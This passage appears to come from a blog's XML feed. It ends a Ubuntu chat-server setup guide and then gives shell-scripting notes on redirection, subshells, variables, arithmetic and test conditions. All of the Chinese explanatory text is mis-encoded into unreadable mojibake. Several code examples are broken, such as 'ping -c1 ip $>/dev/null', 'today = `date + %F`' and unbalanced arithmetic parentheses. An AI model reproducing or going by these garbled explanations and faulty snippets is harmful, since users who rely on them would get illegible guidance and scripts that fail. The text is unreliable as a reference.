å‘å¯¼é¡µé¢ åˆ›å»ºè´¦å·ç­‰é…ç½®ï¼ˆç¬¬ä¸€ä¸ªè´¦å·æ˜¯ç®¡ç†å‘˜ï¼‰ 6.ç”¨æˆ·è®¿é—®3000çš„åœ°å€ï¼Œå¯ä»¥æ³¨å†Œè´¦å·ï¼ŒåŠ å…¥èŠå¤©ç­‰ 7.é…ç½®æ•°æ®åº“é›†ç¾¤ï¼ˆè‡ªå·±æŸ¥ï¼Œç”Ÿäº§ç¯å¢ƒå»ºè®®é…ç½®ï¼‰ ç”Ÿäº§ç¯å¢ƒæ•°æ®åº“å¤åˆ¶é›†ç¾¤ Noteï¼šæ•°æ®åº“å»ºè®®ä½¿ç”¨å•ç‹¬çš„æœåŠ¡å™¨ ç³»ç»Ÿä¸­æ–‡æ˜¾ç¤º æ­¤ä¸ºè¡¥å……çŸ¥è¯†ç‚¹ # å…ˆå®‰è£…ä¸­æ–‡è¯­è¨€åŒ… sudo apt install language-pack-zh-hans locale -a # é…ç½®ä¸­æ–‡è¯­è¨€ç¯å¢ƒå˜é‡ vim /etc/environment LANG="zh_CN.UTF-8" LANGUAGE="zh_CN:zh:en_US:en" # é…ç½®ä¸­æ–‡ï¼Œè‹±æ–‡è¿˜æ˜¯ä¼šç»§ç»­ä½¿ç”¨çš„ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>èŠå¤©æœåŠ¡</tag>
        <tag>ubuntu server</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>%2Fposts%2F1%2F</url>
    <content type="text"><![CDATA[title: shellè„šæœ¬åŸºæœ¬çŸ¥è¯†categories: Linuxtags: Linux Shellabbrlink: 44249date: 2020-03-16 17:01:17keywords:description: åº”ç”¨åœºæ™¯ è‡ªåŠ¨æ‰¹é‡ç³»ç»Ÿåˆå§‹åŒ–ï¼ˆupdateï¼Œè½¯ä»¶å®‰è£…ï¼Œæ—¶åŒºè®¾ç½®ï¼Œå®‰å…¨ç­–ç•¥â€¦ï¼‰ è‡ªåŠ¨åŒ–æ‰¹é‡è½¯ä»¶éƒ¨ç½²ç¨‹åºï¼ˆLAMP/LNMP/Apache/LVS/Nginx) ç®¡ç†åº”ç”¨ç¨‹åºï¼ˆKVMï¼Œé›†ç¾¤ç®¡ç†æ‰©å®¹ï¼ŒMySQLï¼Œ DELLR720æ‰¹é‡RAIDï¼‰ æ—¥å¿—åˆ†æå¤„ç†æ—¥å¿—ï¼ˆPV,UV, 200,!200, top 100/ grep, awkï¼‰ è‡ªåŠ¨åŒ–å¤‡ä»½æ¢å¤ç¨‹åº(MySQLå®Œå…¨/å¢é‡å¤‡ä»½ + Crond) è‡ªåŠ¨åŒ–ç®¡ç†ç¨‹åº(æ‰¹é‡è¿œç¨‹ä¿®æ”¹å¯†ç ï¼Œè½¯ä»¶å‡çº§ï¼Œé…ç½®æ›´æ–°) è‡ªåŠ¨åŒ–ä¿¡æ¯é‡‡é›†åŠç›‘æ§ç¨‹åºï¼ˆå®æ—¶åœ°æ”¶é›†ç³»ç»Ÿ/åº”ç”¨çš„çŠ¶æ€ä¿¡æ¯:CPU,Mem,Disk,Netâ€¦ï¼‰ é…åˆzabbixä¿¡æ¯é‡‡é›†ï¼ˆå®æ—¶åœ°æ”¶é›†ç³»ç»Ÿ/åº”ç”¨çš„çŠ¶æ€ä¿¡æ¯:CPU,Mem,Disk,Netâ€¦ï¼‰ è‡ªåŠ¨åŒ–æ‰©å®¹ï¼ˆå¢åŠ äº‘ä¸»æœº-&gt;éƒ¨ç½²åº”ç”¨ï¼‰ Zabbixç›‘æ§CPU 80% + è°ƒç”¨Pythonçš„api å¯¹AWS/EC2ï¼ŒESC(å¢åŠ  /åˆ é™¤äº‘ä¸»æœº)+ Shell è„šæœ¬ï¼ˆä¸šåŠ¡ä¸Šçº¿ï¼‰ ç¨‹åºçš„ç»„æˆï¼š é€»è¾‘ + æ•°æ® åŸºæœ¬ç”¨æ³•ä¸€.å¸¸è¯†1.è¾“å…¥è¾“å‡ºé‡å®šå‘ ## æ–‡ä»¶æè¿°ç¬¦ï¼š0ï¼Œ1,2 (å¯¹åº”ï¼šè¿›ç¨‹è¾“å…¥çš„æ–‡ä»¶ï¼Œè¿›ç¨‹è¾“å…¥çš„æ–‡ä»¶ï¼Œè¿›ç¨‹æ‰“å¼€é”™è¯¯çš„æ–‡ä»¶) 0è¡¨ç¤ºæ ‡å‡†è¾“å…¥ 1è¡¨ç¤ºæ ‡å‡†è¾“å‡º 2è¡¨ç¤ºæ ‡å‡†é”™è¯¯è¾“å‡º ## è¾“å…¥è¾“å‡ºé‡å®šå‘ # >, >> > é»˜è®¤ä¸ºæ ‡å‡†è¾“å‡ºé‡å®šå‘ï¼Œä¸ 1> ç›¸åŒ 2>&amp;1 æŠŠæ ‡å‡†é”™è¯¯è¾“å‡º é‡å®šå‘åˆ° æ ‡å‡†è¾“å‡º. &amp;>a.txt æŠŠæ ‡å‡†è¾“å‡º å’Œ æ ‡å‡†é”™è¯¯è¾“å‡º éƒ½é‡å®šå‘åˆ°æ–‡ä»¶ä¸­ # 2>, 2>> é”™è¯¯è¾“å‡ºæœ€ä½³ # 2>>&amp;1, &amp;> æè¿°ç¬¦ä¸º2çš„å†…å®¹è¾“å…¥åˆ°æè¿°ç¬¦ä¸º1çš„å†…å®¹(&amp;> æ˜¯æ··åˆè¾“å‡º) cat &lt; /etc/hosts #ï¼ˆæ²¡åŠ ä»»ä½•å‚æ•°ï¼‰ å’Œä¸åŠ &lt;çš„æœºåˆ¶ä¸ä¸€æ · cat &lt; /etc/hosts > test/aaa.txt # ç›¸å½“äºcopyæ–‡ä»¶å†…å®¹ cat &lt;&lt; EOF # è¾“å…¥å†…å®¹è®©catæ¥æ‰§è¡Œ cat &lt;&lt;EOF > file1 # æŠŠä¸€ä¼šè¾“å…¥çš„æ–‡ä»¶æ”¾åˆ°æ–‡ä»¶é‡Œé¢å» # æ··åˆé‡å®šå‘ è¾“å‡ºåˆ°/dev/nullå°±æ˜¯ä»€ä¹ˆéƒ½ä¸æ˜¾ç¤ºåˆ°ç»ˆç«¯ &amp;> /dev/null 2.ä¸€äº›å¿«æ·é”® # ^R æœç´¢å†å²å‘½ä»¤ # ![number] æ‰§è¡Œå†å²å‘½ä»¤ä¸­ç¼–å·ä¸º`number`çš„å‘½ä»¤ # ! string æ‰¾åˆ°æœ€è¿‘ä¸€ä¸ªä»¥æŒ‡å®šstrå¼€å¤´çš„å‘½ä»¤, å¦‚ï¼š!da # !! ä¸Šä¸€ä¸ªå‘½ä»¤ï¼ˆåœ¨è„šæœ¬ä¸­æ˜¯ä¸èƒ½æ‰‹åŠ¨æŒ‰æ–¹å‘é”®çš„ï¼‰ # !$ shellä¸Šä¸€ä¸ªå‘½ä»¤çš„æœ€åä¸€ä¸ªå‚æ•°ï¼Œ æ¯”å¦‚ï¼šls aaa/bb /etc/passwd, å†æ‰§è¡Œï¼š head !$, çœ‹åˆ°æ˜¯çš„passwdçš„å†…å®¹ # ^D é€€å‡º # ^A è·³åˆ°æœ€å‰ # ^E è·³åˆ°æœ€å # ^K å‘ååˆ é™¤ # ^U å‘å‰ åˆ é™¤ # ^Y æ’¤é”€ # ^L # ^S é”å±æš‚åœ # ^Q æ¢å¤ 3.åœ¨bashç¨‹åºä¸­åµŒå…¥ä¸€ä¸ªpythonä»£ç  #!/bin/bash # ç¬¬ä¸€è¡Œä¸æ˜¯æ³¨é‡Šï¼Œ å£°æ˜ç”¨å“ªä¸ªè§£é‡Šå™¨ #! ping -c1 114.114.114.114 &amp;&amp; echo "114.114.114.114 is up" || echo "114.114.114.114 id down" # &lt;&lt;-DOFï¼šEOFæ˜¯å¼€å§‹ç»“æŸçš„æ ‡è¯†ï¼ˆå°æ¨ªæ ä»£è¡¨ä»¥ä¸‹æŒ‰tab,ä¸‹é¢çš„pyä»£ç å¯ä»¥ä¸tabç¼©è¿›), EOFæ˜¯ä¸æˆæ–‡çš„è§„èŒƒ # æ•´ä¸ªç¨‹åºè¿˜æ˜¯ä½¿ç”¨bashè§£é‡Šå™¨ï¼Œåªä¸è¿‡æ˜¯ä¸­é—´"è¯·æ¥ä¸€ä¸ªäºº - python" # å¦‚ä¸‹ï¼š /usr/bin/python3 &lt;&lt;-EOF print("hello py") EOF echo "hello bash" # åœ¨bashä¸­è°ƒç”¨ pythonï¼š expect # å¦‚æœåœ¨pythonä¸­ä½¿ç”¨bashï¼Œ è¦è°ƒç”¨os.system('ç³»ç»Ÿå‘½ä»¤') æ²¡æœ‰-çš„è¯ï¼ŒEOFä½œä¸ºç»“æŸç¬¦ï¼Œå‰é¢ä¸èƒ½æœ‰ä»»ä½•tabåˆ¶è¡¨ç¬¦ã€‚æœ‰-çš„è¯ï¼ŒEOFä½œä¸ºç»“æŸç¬¦ï¼Œå‰é¢å¯ä»¥æœ‰tabåˆ¶è¡¨ç¬¦,å®¹é”™ç‡æ›´é«˜ä¸€ç‚¹ã€‚ 4.é…åˆfigletæ‰“å°èœå•: #!/bin/bash cat &lt;&lt;EOF +-----------------------------------------------------+ | _ | | _ __ ___ __ _ _ __ _ _ __ _| | | | | '_ \` _ \ / _\` | '_ \| | ||/ _\` | | | | | | | | | | (_| | | | | |_| |(_| | | | | |_| |_| |_|\__,_|_||_|\__,_|\__,_|_| | | | +-----------------------------------------------------+ EOF 5.å­shell #!/bin/bash cd ~/Desktop ls # è¿™ç§åšæ³•ï¼Œåœ¨ç»ˆç«¯æ‰§è¡Œå®Œæ¯•ä¹‹åï¼Œå½“å‰ç›®å½•è¿˜æ˜¯æ²¡æœ‰å˜ï¼Œå› ä¸ºä»–æ˜¯åœ¨subshell ï¼ˆå­shellä¸­æ‰§è¡Œçš„ï¼‰ # è¦æƒ³ä½¿å¾—subshellä¸­çš„ç”Ÿæ•ˆï¼Œå°±è¦ä½¿ç”¨`.` æˆ–è€… `source` ####### æ‰§è¡Œè„šæœ¬ ./01.sh # éœ€è¦æ‰§è¡Œæƒé™ï¼Œåœ¨å­shellä¸­æ‰§è¡Œ bash 01.sh # ä¸éœ€è¦æ‰§è¡Œæƒé™ï¼Œåœ¨å­shellä¸­æ‰§è¡Œ 01.sh # éœ€è¦æ‰§è¡Œæƒé™ï¼Œåœ¨å½“å‰shellä¸­æ‰§è¡Œ source 01.sh # ä¸éœ€è¦æ‰§è¡Œæƒé™ï¼Œåœ¨å½“å‰shellä¸­æ‰§è¡Œ 6.shellå…ƒå­—ç¬¦ é€šé…ç¬¦, æ³¨æ„åŒºåˆ†ä¸æ­£åˆ™ä¸­çš„å…ƒå­—ç¬¦ #ï¼/bin/bash # * ä»»æ„å¤šä¸ªå­—ç¬¦ ls /etc/net* # ? ä»»æ„ä¸€ä¸ªå­—ç¬¦ ls home/xp? # [] åŒ¹é…æ‹¬å·å†…ä»»æ„ä¸€ä¸ªå­—ç¬¦ [abc] [a-z] [^a-zA-Z0-9] # ^å–å l[io]ve l[^a-z]ve # () å‘½ä»¤åœ¨å­shellä¸­æ‰§è¡Œ (umask 077; touch test.txt) # ä¸å½±å“åˆ›å»ºæ–‡ä»¶çš„æƒé™ï¼Œå½“å‰shellçš„umaskä¹Ÿæ²¡æœ‰æ”¹å˜ # ----- å›é¡¾ï¼Œå­shellï¼š .test.sh, source x.sh # {} é›†åˆ touch {1..9} mkdir /home/{111,222} mkdir -pv /home/{333,{aaa,bbb}, 444} cp -rv /etc/{passwd, passwd.old} # å‰é¢çš„ç›¸åŒçš„è·¯å¾„å¯ä»¥å†™åœ¨ä¸€å—ï¼Œåé¢ä¸åŒçš„{}èµ·æ¥ cp -rv /etc/passwd{,.old} # å‰é¢çš„ç›¸åŒçš„è·¯å¾„å¯ä»¥å†™åœ¨ä¸€å—ï¼Œåé¢ä¸åŒçš„{}èµ·æ¥ # \ è½¬ä¹‰ç¬¦ è®©å…ƒå­—ç¬¦å›å½’æœ¬æ„ echo \* echo \\ echo \ #åé¢ç´§è·Ÿå›è½¦ï¼Œä¹Ÿå°±è½¬ä¹‰äº†å›è½¦ # -e å¸¸è§„å­—ç¬¦è½¬å˜ä¸ºç‰¹æ®Šæ„ä¹‰çš„ï¼š echo -e "a\tb\nc" 7.å‰å°åå° #!/bin/bash ## &amp; (å…³é—­xshellï¼Œå¯¹åº”çš„ä»»åŠ¡ä¹Ÿè·Ÿç€åœæ­¢) sh test.sh &amp; ## nohub #ä»»åŠ¡æ”¾åˆ°åå°ï¼Œå…³é—­æ ‡å‡†è¾“å…¥ï¼Œç»ˆç«¯ä¸å†èƒ½å¤Ÿæ¥æ”¶ä»»ä½•è¾“å…¥ï¼ˆæ ‡å‡†è¾“å…¥ï¼‰,é‡å®šå‘æ ‡å‡†è¾“å‡ºå’Œæ ‡å‡†é”™è¯¯åˆ°nohup.outä¸­ nohup sh test.sh ## åŒºåˆ†`nohub`ä¸`&amp;`: 1.&amp; æ˜¯æŒ‡åœ¨åå°è¿è¡Œï¼Œä½†å½“ç”¨æˆ·æ¨å‡º(æŒ‚èµ·)çš„æ—¶å€™ï¼Œå‘½ä»¤è‡ªåŠ¨ä¹Ÿè·Ÿç€é€€å‡º 2.nohub é€€å‡ºç»ˆç«¯ä¹‹åè¯¥è¿›ç¨‹è¿˜æ˜¯æœ‰çš„ ## nohubä¸&amp;åˆä½“ #å°†sh test.shä»»åŠ¡æ”¾åˆ°åå°ï¼Œä½†æ˜¯ä¾ç„¶å¯ä»¥ä½¿ç”¨æ ‡å‡†è¾“å…¥ï¼Œç»ˆç«¯èƒ½å¤Ÿæ¥æ”¶ä»»ä½•è¾“å…¥ï¼Œé‡å®šå‘æ ‡å‡†è¾“å‡ºå’Œæ ‡å‡†é”™è¯¯åˆ°å½“å‰ç›®å½•ä¸‹çš„nohup.outæ–‡ä»¶ï¼Œå³ä½¿å…³é—­xshellé€€å‡ºå½“å‰sessionä¾ç„¶ç»§ç»­è¿è¡Œã€‚ nohup sh test.sh &amp; ## screen apt install screen # å®‰è£… `sleep 100000` # å…ˆæ‰§è¡Œ,ç„¶åé€€å‡ºç»ˆç«¯ï¼Œ `screen -list` # å†æ¬¡æ‰“å¼€ç»ˆç«¯,æŒ‡å®šè¿™ä¸ªå‘½ä»¤ï¼Œçœ‹åˆ°id `screen -r yourID` # ç„¶åè¾“å…¥è¿™ä¸ªå‘½ä»¤,ä¸€åˆ‡å°±å›æ¥äº† ## shellçš„ä¼šè¯ä½œä¸šæœºåˆ¶ ctrl +c # æ€æ‰çš„æ˜¯å‰å°è¿›ç¨‹ # ^Z æ”¾åˆ°åå°ï¼Œ fg è°ƒå›æ¥ kill %3 # ç»™å½“å‰ç»ˆç«¯ä½œä¸šå·ä¸º3çš„å‘ä¿¡å· ## jobs æŸ¥çœ‹ä½œä¸š ## ç®¡é“ | # tee ç®¡é“, -a æœ€ä½³ date | tee -a date.txt # è¾“å‡ºåˆ°æ–‡ä»¶ï¼ŒåŒæ—¶æˆªæµï¼ˆèƒ½åœ¨ç»ˆç«¯ç›´è§‚åœ°çœ‹åˆ°ï¼‰ ## æŠ€å·§: vimé‡Œé¢å†™è„šæœ¬ï¼Œå¯ä»¥æŒ‰^Zæš‚åœï¼Œåˆ°ç»ˆç«¯æ•²å‘½ä»¤ï¼Œè®©fgè¿”å›ç»§ç»­ 8.å‘½ä»¤æ’åº ; ä¸å…·å¤‡é€»è¾‘æ’åº ï¼ˆå‰é¢æ‰§è¡Œå®Œæ¯•å°±æ‰§è¡Œåé¢çš„ï¼Œä¸ç®¡å‰é¢æˆåŠŸå¤±è´¥ä¸å¦ï¼‰ &amp;&amp; å‰é¢æ‰§è¡ŒæˆåŠŸ(å³è¿”å›å€¼$?ä¸º0)å°±æ‰§è¡Œåé¢çš„ || å‰é¢æ‰§è¡Œå¤±è´¥(å³è¿”å›å€¼$?ä¸ºä¸ä¸º0)å°±æ‰§è¡Œåé¢çš„ ç›¸å½“äº if else 9.echoé¢œè‰²è¾“å‡º ä½¿ç”¨åœºæ™¯ï¼šç»™ç”¨æˆ·é†’ç›®æç¤º #!/bin/bash # -e æ‰å¯ä»¥ # \e[1;3x # \e[1;3x å‰æ™¯è‰²(30-37),måé¢æ˜¯æ–‡å­— echo -e "\e[1;31mThis is a red" echo -e "\e[1;33mThis is a yellow" # 0m æ¢å¤é¢œè‰² echo -e "\e[1;0m" echo -e "no color" ## å¸¸ç”¨ï¼š å‰é¢å˜è‰²ä¹‹åï¼Œ åé¢ç´§è·Ÿï¼š\e[0m ä¸å˜è‰²(åé¢çš„å†…å®¹å°±æ­£å¸¸äº†) echo -e "\e[1;31mThis is a red text. \e[0m" echo -e "no color again" ## èƒŒæ™¯è‰²(40-47) echo -e "\e[1;41mThis is a red text background coloe. \e[0m" echo -e "\e[1;42mThis is a red text background coloe. \e[0m" echo -e "\e[1;43mThis is a red text background coloe. \e[0m" echo -e "\e[1;44mThis is a red text background coloe. \e[0m" echo -e "\e[1;45mThis is a red text background coloe. \e[0m" # printf ä¹Ÿæ˜¯ï¼Œä¸è¿‡æ˜¯åŠ äº†è¾“å‡ºæ ¼å¼ 10.åˆ‡æ¢ç”¨æˆ· # åˆ‡æ¢ç”¨æˆ·å°½é‡åŠ  - su - xxx # åŠ æ¨ªçº¿ï¼Œ shellçš„ç¯å¢ƒä¹Ÿè·Ÿéšæ”¹å˜ ï¼ˆlogin shellï¼‰ ï¼› æ‰§è¡Œçš„æ˜¯å‰å››ä¸ª: bashrcå’Œprofile su xxx # ä¸åŠ æ¨ªçº¿ï¼Œå½“å‰ç¯å¢ƒè¿˜æ˜¯å½“å‰çš„ () ï¼› æ‰§è¡Œçš„æ˜¯ä¸¤ä¸ªbashrcæ–‡ä»¶ 11.å…³äºbashçš„æ–‡ä»¶ ## å…³äºbashçš„æ–‡ä»¶ï¼š # ç³»ç»Ÿçº§åˆ« æ¥åˆ°shellæ—¶å€™æ‰§è¡Œ /etc/profile /etc/bashrc # ç”¨æˆ·çº§åˆ« æ¥åˆ°shellæ—¶å€™æ‰§è¡Œ ~/.bashrc ~/.profile # ç¦»å¼€shellæ—¶å€™æ‰§è¡Œ ~/.bash_logout ~/.bash_history # ä¿®æ”¹ç”¨æˆ·çš„shell usermod -s /bin/bash xps # ä¸‹é¢ä¸¤ä¸ª # login shell # nologin shell # /bin/bash # /sbin/nologin 12.å…¶ä»– # shift ä½¿ä½ç½®å‚æ•°å‘å·¦ç§»åŠ¨ï¼Œé»˜è®¤ç§»åŠ¨1ä½ï¼Œå¯ä»¥ä½¿ç”¨shift2 while [ $# -ne 0 ] do let sum+=$i shift # shift 2 done echo "$sum" äºŒ.å˜é‡ä½ç½®å˜é‡è„šæœ¬æ‰§è¡Œæ—¶ï¼Œåé¢çš„ç¬¬å‡ ä¸ªå‚æ•° $1 åé¢ç¬¬ä¸€ä¸ªå‚æ•° $2 $3 ${10} ## æ¯”å¦‚ä¸‹é¢çš„ä¾‹å­; # bash test.sh 111 222 333 ping -c1 $1 &amp;>/dev/null if [ $? -eq 0 ] # å¦‚æœ`ä¸Šä¸€æ¡å‘½ä»¤`è¿”å›å€¼ç­‰äº0(æ­£å¸¸æ‰§è¡Œ) -eq then echo "$1 is up" else echo "$1 is down" fi é¢„å®šä¹‰å˜é‡$0 # è„šæœ¬å $* # æ‰€æœ‰çš„å‚æ•° $@ # æ‰€æœ‰çš„å‚æ•° $# # å‚æ•°çš„ä¸ªæ•° $$ # å½“å‰è¿›ç¨‹çš„PID echo $$ $! # ä¸Šä¸€ä¸ª`åå°`è¿›ç¨‹çš„PID $? # ä¸Šä¸€ä¸ªå‘½ä»¤çš„è¿”å›å€¼ï¼ˆ0ä¸ºæˆåŠŸï¼‰ ping æ–‡ä»¶ # å¦‚æœç”¨æˆ·æ²¡æœ‰åŠ å‚æ•° if [ $# -eq 0 ];then echo "usage: file `basename $0` need parmter" exit fi å¦‚æœæ˜¯æ–‡ä»¶ -f # ç¬¬ä¸€ä¸ªå‚æ•°å¦‚æœä¸æ˜¯æ–‡ä»¶ if [ ! -f $1 ];then echo "not a file" exit fi ## # ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æ–‡ä»¶ï¼Œä»ä¸­è¯»å–ipç„¶åping for ip in `cat $1` do ping -c1 ip $>/dev/null if [ $? -eq 0 ];then echo "$ip is up" else echo "$ip is down" fi done ## # basename å§‹ç»ˆæ˜¾ç¤ºè·¯å¾„æœ€åä¸€ä¸ªæ–‡ä»¶ # dirname å§‹ç»ˆæ˜¾ç¤ºè·¯å¾„å‰é¢ç›®å½•çš„åå­— ç¯å¢ƒå˜é‡export ## åœ¨ç³»ç»Ÿé…ç½®ä¸­ç”¨çš„å¤š # ä¾‹å¦‚ï¼šè‡ªå·±æ·»åŠ ç¯å¢ƒå˜é‡ï¼šåˆ°/etc/profile PATH=$PATH:/new/bin export PATH # ç„¶åsourcess # æŸ¥çœ‹ç¯å¢ƒå˜é‡ echo $PATH echo UID echo $SHELL echo $USER echo $HISTORY #å†å²è®°å½•å‘½ä»¤é»˜è®¤è®°å½•1000æ¡ # æ˜¾ç¤ºæ‰€æœ‰çš„ç¯å¢ƒå˜é‡ï¼š env # å–æ¶ˆç¯å¢ƒå˜é‡ï¼š unset å˜é‡å è‡ªå®šä¹‰å˜é‡ä½œç”¨èŒƒå›´ï¼šå½“å‰shellä¸­ç”Ÿæ•ˆ(a.shæˆ–bash a.sh)ï¼Œ å­shellä¸­ä¸è¡Œ ## è½¬ä¸ºç¯å¢ƒå˜é‡ export (åœ¨ä¸€ä¸ªè„šæœ¬æ–‡ä»¶ä¸­exportï¼Œ åœ¨å¦ä¸€ä¸ªè„šæœ¬ä¸­å°±å¯ä»¥è·å–äº†) export ip1 ## ps: è‡ªå·±æ²¡å¿…è¦å®šä¹‰ç¯å¢ƒå˜é‡ F1: å…ˆ .test.sh å†echo $ip1 F2: æˆ–è€…åœ¨ä¸€ä¸ªè„šæœ¬ä¸­å¼•ç”¨åŠ è½½å¦å¤–ä¸€ä¸ªè„šæœ¬(./test.sh)ï¼Œåé¢å°±å¯ä»¥ç”¨äº†ï¼ˆæ²¡å¿…è¦åœ¨æ¯ä¸ªæ–‡ä»¶ä¸­éƒ½å®šä¹‰ä¸€éå˜é‡ï¼‰ å˜é‡çš„èµ‹å€¼1.æ˜¾å¼èµ‹å€¼ ï¼ˆå˜é‡è¦ä»¥å­—æ¯æˆ–è€…ä¸‹åˆ’çº¿å¼€å¤´ï¼Œæ•°å­—ä¸å¯ä»¥å¼€å¤´ï¼‰ ## å¸¸è§„èµ‹å€¼ # shellä¸­æ²¡æœ‰æ•°æ®ç±»å‹ï¼Œéƒ½æ˜¯å­—ç¬¦ä¸² ## å‘½ä»¤æ›¿æ¢, å…ˆæŠŠè¿™ä¸ªå‘½ä»¤æ‰§è¡Œä¸€éå†èµ‹å€¼: åå¼•å· ` `, $() today = `date + %F` 2.readè¯»å–èµ‹å€¼ ## -pæç¤ºä¿¡æ¯ã€‚-tç­‰å¾…æ—¶é—´ã€‚-nåªè¦å‰é¢å‡ ä¸ªå­—ç¬¦ # read -p "æç¤ºä¿¡æ¯ï¼š " å˜é‡å # read -t 5 -p "æç¤ºä¿¡æ¯ï¼š " å˜é‡å # read -n 2 å˜é‡å # read å¯ä»¥åŒæ—¶è·Ÿå¤šä¸ªå˜é‡ã€‚ç©ºæ ¼éš”å¼€ï¼Œç›´æ¥ä¸€æ¬¡æ€§èµ‹å€¼ read -p "è¾“å…¥å§“åï¼Œå¹´é¾„ï¼Œæ€§åˆ«[e.g zhangsan 20 m]ï¼š " name age gender echo "your name: $name, your age $age, your gender $gender" ### æ³¨æ„äº‹é¡¹ï¼š "" # å¼±å¼•ç”¨(é‡Œé¢å¯ä»¥æ”¾å˜é‡$ip) '' # å¼ºå¼•ç”¨ï¼ˆé‡Œé¢ä¸èƒ½å¼•ç”¨å˜é‡,ä¼šåŸæ ·è¾“å‡ºï¼‰ ### å‘½ä»¤æ›¿æ¢ï¼š `` ç­‰ä»·äº $(), é‡Œé¢çš„å‘½ä»¤ä¼šå…ˆæ‰§è¡Œ ä½¿ç”¨å˜é‡ å˜é‡èµ‹å€¼ï¼Œç­‰å·ä¸¤è¾¹ä¸èƒ½æœ‰ç©ºæ ¼ ping -c1 $ip &amp;>/dev/null &amp;&amp; echo "$ip is up" || echo "$ip is down" å˜é‡å¼•ç”¨## å¼•ç”¨ 1. $å˜é‡ 2. ${å˜é‡} # å¤§æ‹¬å·ç®€å•ç†è§£ä¸ºï¼šé˜²æ­¢æ­§ä¹‰ å˜é‡çš„è¿ç®— ä½¿ç”¨åœºæ™¯ï¼šå†…å­˜ä½¿ç”¨, pingæ¬¡æ•°ç­‰ â€¦ â€¦ ## 1.æ•´æ•°è¿ç®— 90%ä»¥ä¸Š # æ–¹æ³•1ï¼š expr + - \* / % expr 1+2 expr $num1 + $num2 # æ–¹æ³•2ï¼š $(()) + - * / % echo $(($num1+$num2)) echo $((num1+num2)) echo $((5-3*2)) echo $(((5-3)*2)) echo $(((2**3)) echo $(((1+2));echo $sum # æ–¹æ³•3ï¼š $[] + - * / % echo $[5+2] echo $[5**2] # æ–¹æ³•4ï¼š let ä½¿ç”¨æœ€å¤š let sum=2+3;echo $sum let i++;echo $i ## 2.å°æ•°è¿ç®— echo "2*4"|bc echo "2^4"|bc echo "scale=2;6/4"|bc awk 'BEGIN{print 1/2}' echo "print 5.0/2"|python å˜é‡çš„åˆ é™¤/æ›¿æ¢ ä½¿ç”¨åœºæ™¯ï¼šè®©ä½ è¾“å…¥å€¼ä½†æ˜¯ä½ æ²¡è¾“å…¥ï¼Œæˆ‘å°±ç»™ä½ ä¸€ä¸ªé»˜è®¤å€¼ ### åˆ é™¤ url="www.baidu.com" echo ${#url} # ä»å‰å¾€åï¼Œäº•å·ï¼Œè¾“å‡ºé•¿åº¦ï¼Œ æœ€çŸ­åŒ¹é… echo ${url#www.} # æŠŠå‰é¢éƒ¨åˆ†åˆ é™¤ echo ${url#*baidu.} # æŠŠå‰é¢éƒ¨åˆ†åˆ é™¤ * echo ${url##*.} # ä»å‰å¾€åï¼Œè´ªå©ªåŒ¹é…ï¼Œæœ€é•¿åŒ¹é… echo ${url%.} # ä»åå¾€å‰, æœ€çŸ­åŒ¹é… echo ${url%%.} # ä»åå¾€å‰ï¼Œè´ªå©ªåŒ¹é… ### åˆ‡ç‰‡ echo ${urlï¼š0:5} # echo ${urlï¼š5:5} # ä»5å¼€å§‹ï¼Œæ‹¿5ä¸ª echo ${urlï¼š5:} ### å˜é‡å†…å®¹çš„æ›¿æ¢ url="www.baidu.com" echo ${url/baidu/sina} # ç™¾åº¦æ¢æˆæ–°æµª echo ${url/n/N} echo ${url//n/N} # è´ªå©ªåŒ¹é… ## ${å˜é‡å-æ–°å˜é‡å€¼} # æ›¿ä»£(æ²¡èµ‹å€¼ï¼›å¦‚æœå˜é‡ä¹‹å‰æœ‰å€¼å³ä¾¿æ˜¯ç©ºå€¼å°±ä¸èƒ½æ›¿ä»£) unset var1 echo ${var1-aaa} ## ${å˜é‡å:-æ–°å˜é‡å€¼} # æ²¡èµ‹å€¼æˆ–è€…ä¸ºç©ºï¼Œå°±å¯ä»¥æ›¿ä»£ï¼›å¦‚æœå˜é‡ä¹‹å‰æœ‰å€¼å°±ä¸èƒ½æ›¿ä»£ ### æ‹“å±•ï¼š ${å˜é‡å+æ–°å˜é‡å€¼} ${å˜é‡å:+æ–°å˜é‡å€¼} ${å˜é‡å=æ–°å˜é‡å€¼} ${å˜é‡å:=æ–°å˜é‡å€¼} ${å˜é‡å?æ–°å˜é‡å€¼} ${å˜é‡å:?æ–°å˜é‡å€¼} #### è‡ªå¢è‡ªå‡ # i++ # ++i ## å¯¹å˜é‡å€¼çš„å½±å“ï¼š æ²¡å•¥åŒºåˆ« ## å¯¹è¡¨è¾¾å¼å€¼çš„å½±å“ï¼š ++i å…ˆè‡ªå¢å†èµ‹å€¼ï¼Œ i++ å…ˆèµ‹å€¼åœ¨è‡ªå¢ ä¸‰.æ¡ä»¶åˆ¤æ–­if shellä¸­æœ€æ ¸å¿ƒçš„ 1.æ–‡ä»¶æµ‹è¯• [æ“ä½œç¬¦ + æ–‡ä»¶æˆ–ç›®å½•] å‘½ä»¤æ ¼å¼1ï¼štest # æ¯”å¦‚åˆ¤æ–­æ–‡ä»¶æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœå­˜åœ¨å°±å¤‡ä»½(æ¦‚å¿µç‰ˆ) back_dir=/var/mysql_bak if ! test -d $back_dir;then # æ¡ä»¶æµ‹è¯•è¯­å¥testï¼Œ å¦‚æœä¸æ˜¯ç›®å½•æˆ–è€…è¿™ä¸ªç›®å½•ä¸å­˜åœ¨ mkdir -p $back_dir fi echo "å¼€å§‹å¤‡ä»½..." # æ‰§è¡Œ bash -vx test.sh -vxå¯ä»¥çœ‹è¯¦ç»†æ‰§è¡Œè¿‡ç¨‹ å‘½ä»¤æ ¼å¼2ï¼š [ -d /home ] æ–¹æ‹¬å·å–ä»£äº†test(æ³¨æ„æœ‰ç©ºæ ¼) # man testï¼Œ å¸®åŠ©æ–‡æ¡£ç›¸åŒã€‚ å‰åŠè¾¹æ˜¯å‘½ä»¤[, ååŠè¾¹]åªæ˜¯ä¸€ä¸ªç¬¦å· back_dir=/var/mysql_bak if [ ! -d $back_dir ];then # 